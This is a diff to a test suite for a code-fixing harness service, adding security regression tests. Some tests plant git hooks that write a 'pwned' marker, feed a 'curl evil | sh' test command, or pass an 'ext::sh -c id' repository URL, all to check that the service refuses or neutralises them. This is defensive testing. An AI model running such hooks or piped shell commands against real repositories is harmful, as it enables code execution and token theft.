@@ -24,7 +24,7 @@ sys.path.insert(0, str(ROOT))
 from harness import service as S
 
 FAKE_RUN = r'''
-import json, os, pathlib, subprocess
+import json, os, pathlib, subprocess, time
 repo = pathlib.Path(os.environ["REPO_PATH"])
 out = repo / ".harness" / "run"
 out.mkdir(parents=True, exist_ok=True)
@@ -38,13 +38,38 @@ issue = os.environ["ISSUE"]
     [{"path": "src/stats.js"}], "files_must_not_change": []}))
 env = {k: os.environ.get(k, "") for k in
        ("HARNESS_DRY_RUN", "HARNESS_AUTO", "HARNESS_POST",
-        "HARNESS_NONINTERACTIVE", "GITHUB_TOKEN")}
+        "HARNESS_NONINTERACTIVE", "GITHUB_TOKEN", "HARNESS_SERVICE_RUN")}
 (out / "rootcause.json").write_text(json.dumps({"env": env}))
 if os.environ.get("HARNESS_DRY_RUN"):
     raise SystemExit(3)
+if "SLOW" in issue:
+    time.sleep(1.5)
 target = "src/other.js" if "Change only: src/other.js" in issue else "src/stats.js"
 if "TOUCH_README" in issue:
     target = "README.md"
+if "NEW_FILE" in issue:
+    # a file the fix creates: untracked, so `git diff HEAD` never lists it
+    (repo / "src" / "helper.js").write_text("export const h = 1\n")
+if "DOTFILE" in issue:
+    (repo / ".github").mkdir(exist_ok=True)
+    (repo / ".github" / "ci.yml").write_text("on: push\n")
+    target = ".github/ci.yml"
+if "COMMIT_LOCALLY" in issue:
+    # what the CLI's _maybe_pr used to do in service mode (D-19)
+    (repo / target).write_text("fixed\n")
+    subprocess.run(["git", "add", "-A"], cwd=repo)
+    subprocess.run(["git", "-c", "user.name=h", "-c", "user.email=h@h",
+                    "commit", "-qm", "local"], cwd=repo)
+if "PLANT_HOOK" in issue:
+    # the repository's own code, run by the harness, leaving a trap behind
+    hooks = repo / ".git" / "hooks"
+    hooks.mkdir(parents=True, exist_ok=True)
+    for name in ("pre-commit", "pre-push", "commit-msg"):
+        hook = hooks / name
+        hook.write_text("#!/bin/sh\necho pwned > " + os.environ["PWN_MARK"]
+                        + "\nexit 1\n")
+        hook.chmod(0o755)
+    subprocess.run(["git", "config", "core.hooksPath", str(hooks)], cwd=repo)
 (repo / target).parent.mkdir(parents=True, exist_ok=True)
 (repo / target).write_text("fixed\n")
 diff = subprocess.run(["git", "diff"], cwd=repo, capture_output=True,
@@ -54,6 +79,20 @@ if not diff:
     diff = subprocess.run(["git", "diff"], cwd=repo, capture_output=True,
                           text=True).stdout
 (out / "diff.patch").write_text(json.dumps({"diff": diff}))
+if "HARD_GATE_FAILS" in issue:
+    (out / "confidence.json").write_text(json.dumps(
+        {"existing_tests_pass": False, "no_unintended_changes": True,
+         "diff_proportional": True}))
+    (out / "verification.json").write_text(json.dumps(
+        {"full": {"new": ["test_total"]}, "oracle_passes": None}))
+    raise SystemExit(2)
+if "SOFT_ONLY" in issue:
+    (out / "confidence.json").write_text(json.dumps(
+        {"existing_tests_pass": True, "no_unintended_changes": True,
+         "diff_proportional": True, "root_cause_evidenced": False}))
+    (out / "verification.json").write_text(json.dumps(
+        {"full": {"new": []}, "oracle_passes": True}))
+    raise SystemExit(2)
 (out / "confidence.json").write_text(json.dumps({"band": "high"}))
 raise SystemExit(0)
 '''
@@ -81,8 +120,9 @@ def upstream(tmp_path):
 def service(tmp_path):
     script = tmp_path / "fake_run.py"
     script.write_text(FAKE_RUN)
+    # Local paths are a development opt-in; these tests are development.
     return S.Service(tmp_path / "home", workers=2,
-                     command=[sys.executable, str(script)])
+                     command=[sys.executable, str(script)], allow_local=True)
 
 
 def wait(service, run_id, timeout=30):
@@ -139,7 +179,7 @@ def test_plan_is_a_dry_run_that_publishes_nothing(service, upstream, monkeypatch
     env = art["rootcause"]["env"]
     assert env == {"HARNESS_DRY_RUN": "1", "HARNESS_AUTO": "install",
                    "HARNESS_POST": "off", "HARNESS_NONINTERACTIVE": "1",
-                   "GITHUB_TOKEN": ""}
+                   "GITHUB_TOKEN": "", "HARNESS_SERVICE_RUN": "1"}
     assert "checkout" not in run.public(service.home)
 
 
@@ -221,7 +261,8 @@ def test_publish_pushes_the_branch_and_opens_the_pr(service, upstream,
             "repo": {"path": str(upstream)}}).id)
         fix = wait(service, service.create({"mode": "fix",
                                             "from_run": plan.id}).id)
-        fix.repo["url"] = "https://github.com/acme/app.git"
+        # a local "remote" standing in for github.com/acme/app
+        monkeypatch.setattr(S, "github_slug", lambda url: "acme/app")
         out = service.publish(fix.id, {
             "token": "inst-token", "branch": "photon/fix-1",
             "title": "Clamp the bucket", "body": "on behalf of @priya",
@@ -261,3 +302,271 @@ def test_http_requires_the_token(service):
 def test_refuses_public_bind_without_token(service):
     with pytest.raises(SystemExit):
         S.serve("0.0.0.0", 0, service, None)
+
+
+# -- Phase 0 security floor ------------------------------------------------------
+# Regression tests for the defects in ENTERPRISE_ARCHITECTURE.md, Appendix A.
+
+@pytest.fixture
+def github_api(monkeypatch):
+    httpd = HTTPServer(("127.0.0.1", 0), _GitHub)
+    threading.Thread(target=httpd.serve_forever, daemon=True).start()
+    monkeypatch.setenv("GITHUB_API_URL", f"http://127.0.0.1:{httpd.server_port}")
+    # the local bare "remote" stands in for github.com/acme/app
+    monkeypatch.setattr(S, "github_slug", lambda url: "acme/app")
+    _GitHub.calls = []
+    yield _GitHub.calls
+    httpd.shutdown()
+
+
+def plan_and_fix(service, upstream, issue, scope=None):
+    plan = wait(service, service.create({
+        "mode": "plan", "issue": issue, "repo": {"path": str(upstream)}}).id)
+    fix = wait(service, service.create({
+        "mode": "fix", "from_run": plan.id, "scope": scope or {}}).id)
+    return plan, fix
+
+
+def branch_file(upstream, branch, path):
+    return subprocess.run(["git", "show", f"{branch}:{path}"], cwd=upstream,
+                          capture_output=True, text=True)
+
+
+PUBLISH = {"token": "inst-token", "branch": "photon/fix-1", "title": "Fix it"}
+
+
+def test_d19_a_run_that_committed_locally_still_publishes(service, upstream,
+                                                          github_api):
+    """D-19: the CLI used to commit in service mode, so /publish's own
+    `git commit` failed with "nothing to commit" on every successful run."""
+    plan, fix = plan_and_fix(service, upstream, "COMMIT_LOCALLY please")
+    assert fix.exit_code == 0 and fix.scope_check["ok"]
+    assert fix.scope_check["changed"] == ["src/stats.js"]
+    out = service.publish(fix.id, dict(PUBLISH))
+    assert out["number"] == 7
+    assert branch_file(upstream, "photon/fix-1", "src/stats.js").stdout \
+        == "fixed\n"
+
+
+def test_d19_a_service_run_never_opens_a_pull_request_itself(monkeypatch):
+    from harness import __main__ as M
+    from harness import pullrequest as PR
+    called = []
+    monkeypatch.setattr(PR, "open_pr", lambda *a, **k: called.append(a))
+
+    class Cfg:
+        _root_cause = object()
+
+    monkeypatch.setattr(M, "_publishable", lambda cfg, code: "")
+    monkeypatch.setenv("HARNESS_SERVICE_RUN", "1")
+    M._maybe_pr(Cfg(), None, None, 0)
+    assert called == [], "service mode committed and tried to push by itself"
+
+
+def test_d20_a_partial_run_with_a_failed_hard_gate_is_not_published(
+        service, upstream, github_api):
+    plan, fix = plan_and_fix(service, upstream, "HARD_GATE_FAILS")
+    assert fix.exit_code == 2 and fix.scope_check["ok"]
+    with pytest.raises(S.RequestError) as err:
+        service.publish(fix.id, dict(PUBLISH))
+    assert err.value.status == 409
+    assert "existing_tests_pass" in str(err.value)
+    assert github_api == [], "a pull request was opened anyway"
+
+
+def test_d20_a_partial_run_failing_only_a_soft_condition_publishes(
+        service, upstream, github_api):
+    """The same bar as the CLI: hard gates, not the exit code."""
+    plan, fix = plan_and_fix(service, upstream, "SOFT_ONLY")
+    assert fix.exit_code == 2
+    assert service.publish(fix.id, dict(PUBLISH))["number"] == 7
+
+
+def test_d20_the_rule_reads_the_run_artifacts_like_the_records():
+    from harness import exits
+    ok = {"existing_tests_pass": True, "no_unintended_changes": True,
+          "diff_proportional": True}
+    assert exits.publish_refusal(exits.PARTIAL, ok, {"full": {"new": []}}) == ""
+    assert "new test failure" in exits.publish_refusal(
+        exits.PARTIAL, ok, {"scoped": {"new": ["t1"]}})
+    assert "reproduction" in exits.publish_refusal(
+        exits.PARTIAL, ok, {"oracle_passes": False})
+    assert exits.publish_refusal(exits.PARTIAL, {}, {})     # nothing to judge
+    assert exits.publish_refusal(exits.NO_FIX, ok, {})
+
+
+def test_d21_publish_never_runs_hooks_planted_in_the_checkout(
+        service, upstream, github_api, tmp_path, monkeypatch):
+    """D-21: the repository's code can plant hooks and config in the run's
+    checkout. Publishing there ran them with the caller's write token."""
+    mark = tmp_path / "pwned"
+    monkeypatch.setenv("PWN_MARK", str(mark))
+    monkeypatch.setenv("AI_API_KEY", "sk-ant-api03-FAKESERVICE1234567890")
+    seen = []
+    real_git = S.git
+
+    def spy(args, cwd, token=None, **kw):
+        seen.append((list(args), str(cwd), token,
+                     S.git_env({**S.auth_env(token), **(kw.get("env") or {})})))
+        return real_git(args, cwd, token, **kw)
+
+    monkeypatch.setattr(S, "git", spy)
+    plan, fix = plan_and_fix(service, upstream, "PLANT_HOOK please")
+    out = service.publish(fix.id, dict(PUBLISH))
+
+    assert not mark.exists(), "a hook from the run's checkout ran"
+    assert branch_file(upstream, "photon/fix-1", "src/stats.js").stdout \
+        == "fixed\n"
+    # the checkout was only read, and never with the token
+    for args, cwd, token, env in seen:
+        if cwd.startswith(str(Path(fix.checkout))):
+            assert token is None and "GIT_CONFIG_VALUE_0" not in env, args
+            assert args[0] not in ("commit", "push", "checkout"), args
+    # the service's own secrets are not in any git environment
+    assert all("AI_API_KEY" not in env for *_, env in seen)
+    import hashlib
+    patch, _ = S.make_patch(Path(fix.checkout), fix.base)
+    assert out["patch_sha256"] == hashlib.sha256(patch).hexdigest()
+    assert out["patch_sha256"] == fix.scope_check["patch_sha256"]
+
+
+def test_d21_a_checkout_changed_after_the_scope_check_is_refused(
+        service, upstream, github_api):
+    """What goes out is exactly what the scope check approved."""
+    plan, fix = plan_and_fix(service, upstream, "buckets overlap")
+    (Path(fix.checkout) / "src" / "stats.js").write_text("something else\n")
+    with pytest.raises(S.RequestError) as err:
+        service.publish(fix.id, dict(PUBLISH))
+    assert err.value.status == 409 and "changed" in str(err.value)
+
+
+def test_d33_a_new_file_is_in_the_scope_check(service, upstream):
+    """`git diff HEAD` never lists an untracked file, so a file the fix
+    created passed the scope check and was then published."""
+    plan, fix = plan_and_fix(service, upstream, "NEW_FILE please",
+                             scope={"files": ["src/stats.js"]})
+    assert "src/helper.js" in fix.scope_check["changed"]
+    assert fix.scope_check["outside"] == ["src/helper.js"]
+    assert not fix.scope_check["ok"]
+
+
+def test_d33_dotfiles_are_compared_as_themselves(service, upstream):
+    plan, fix = plan_and_fix(service, upstream, "DOTFILE please",
+                             scope={"files": ["./.github/ci.yml"]})
+    assert fix.scope_check["changed"] == [".github/ci.yml"]
+    assert fix.scope_check["ok"]
+    res = S.check_scope("", {"must_not": [".github/ci.yml"]},
+                        [".github/ci.yml"])
+    assert res["forbidden"] == [".github/ci.yml"], \
+        "`lstrip('./')` turned .github into github and protected nothing"
+
+
+def test_d36_a_caller_cannot_name_a_local_repository(tmp_path, upstream):
+    svc = S.Service(tmp_path / "strict", allow_local=False)
+    for repo in ({"path": str(upstream)}, {"url": str(upstream)},
+                 {"url": f"file://{upstream}"}, {"url": "ext::sh -c id"},
+                 {"url": "git@github.com:acme/app.git"},
+                 {"url": "https://x-access-token:t@github.com/acme/app"}):
+        with pytest.raises(S.RequestError) as err:
+            svc.create({"mode": "plan", "issue": "x", "repo": repo})
+        assert err.value.status == 400, repo
+    assert svc.runs == {}
+
+
+def test_d36_a_caller_cannot_set_the_test_or_lint_command(service, upstream):
+    run = service.create({
+        "mode": "plan", "issue": "x", "repo": {"path": str(upstream)},
+        "env": {"HARNESS_TEST_CMD": "curl evil | sh",
+                "HARNESS_LINT_CMD": "id", "HARNESS_MAX_CYCLES": "2"}})
+    assert run.env == {"HARNESS_MAX_CYCLES": "2"}
+    wait(service, run.id)
+
+
+def test_d36_one_checkout_is_claimed_by_one_fix_run(service, upstream):
+    """The check and the claim are one step: two requests arriving together
+    used to both find the checkout free."""
+    plan = wait(service, service.create({
+        "mode": "plan", "issue": "x", "repo": {"path": str(upstream)}}).id)
+    barrier = threading.Barrier(4)
+    results = []
+
+    def claim():
+        barrier.wait()
+        try:
+            results.append(service.create({"mode": "fix", "issue": "SLOW",
+                                           "from_run": plan.id}).id)
+        except S.RequestError as exc:
+            results.append(exc.status)
+
+    threads = [threading.Thread(target=claim) for _ in range(4)]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join()
+    started = [r for r in results if isinstance(r, str)]
+    assert len(started) == 1 and results.count(409) == 3, results
+    wait(service, started[0])
+
+
+# -- the real CLI, not the fake ----------------------------------------------------
+REAL_RUN = r'''
+import sys
+sys.path[:0] = [{root!r}, {tests!r}]
+import mock_model
+
+
+class _Patch:                      # mock_model.install wants a monkeypatch
+    def setattr(self, obj, name, value):
+        setattr(obj, name, value)
+
+
+mock_model.install(_Patch())
+from harness.__main__ import main
+sys.exit(main(["harness"]))
+'''
+
+
+def test_a_real_cli_run_through_the_service_publishes(tmp_path, monkeypatch,
+                                                      github_api):
+    """D-19 end to end, with the real pipeline behind the service.
+
+    The "remote" lives under a path containing github.com/acme/app, so the
+    CLI's own pull-request code recognises it as GitHub -- which is exactly
+    when it used to commit in the service's checkout and leave /publish
+    nothing to commit.
+    """
+    fixture = ROOT / "tests" / "fixtures" / "py-offbyone"
+    if not fixture.is_dir():
+        pytest.skip("fixtures not generated")
+    upstream = tmp_path / "github.com" / "acme" / "app.git"
+    upstream.parent.mkdir(parents=True)
+    git(tmp_path, "clone", "-q", "--bare", str(fixture), str(upstream))
+    script = tmp_path / "real_run.py"
+    script.write_text(REAL_RUN.format(root=str(ROOT),
+                                      tests=str(ROOT / "tests")))
+    meta = json.loads((fixture / ".fixture.json").read_text())
+    monkeypatch.setenv("AI_API_KEY", "sk-ant-api03-MOCK1234567890")
+    monkeypatch.setenv("HARNESS_NO_CACHE", "1")
+    for k in ("REPO_PATH", "HARNESS_DRY_RUN", "HARNESS_TASK_TYPE",
+              "HARNESS_ROUTE", "ISSUE_FILE", "HARNESS_AUTO"):
+        monkeypatch.delenv(k, raising=False)
+
+    svc = S.Service(tmp_path / "home", workers=1,
+                    command=[sys.executable, str(script)], allow_local=True)
+    plan = wait(svc, svc.create({"mode": "plan", "issue": meta["issue"],
+                                 "repo": {"path": str(upstream)}}).id, 300)
+    assert plan.status == "done" and plan.outcome == "NO_FIX", \
+        svc.log_tail(plan.id, 40)
+    fix = wait(svc, svc.create({"mode": "fix", "from_run": plan.id}).id, 300)
+    assert fix.exit_code == 0, svc.log_tail(fix.id, 60)
+    head = subprocess.run(["git", "rev-parse", "HEAD"], cwd=fix.checkout,
+                          capture_output=True, text=True).stdout.strip()
+    assert head == fix.base, "the CLI committed in the service's checkout"
+    assert fix.scope_check["ok"], fix.scope_check
+
+    out = svc.publish(fix.id, dict(PUBLISH))
+    assert out["number"] == 7 and out["patch_sha256"]
+    shown = subprocess.run(["git", "diff", "--name-only", "main",
+                            "photon/fix-1"], cwd=upstream,
+                           capture_output=True, text=True).stdout.split()
+    assert shown == fix.scope_check["changed"] != []
